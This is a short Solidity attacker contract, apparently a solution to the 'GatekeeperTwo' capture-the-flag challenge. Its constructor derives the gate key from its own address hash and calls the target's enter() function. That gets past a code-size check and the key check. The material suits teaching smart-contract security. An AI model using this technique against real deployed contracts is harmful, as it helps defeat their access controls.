pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

import "hardhat/console.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {

    constructor(address addr) {
        IGatekeeperTwo challenge = IGatekeeperTwo(addr);
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (type(uint64).max);
        require(challenge.enter(bytes8(gateKey)));
    }

}
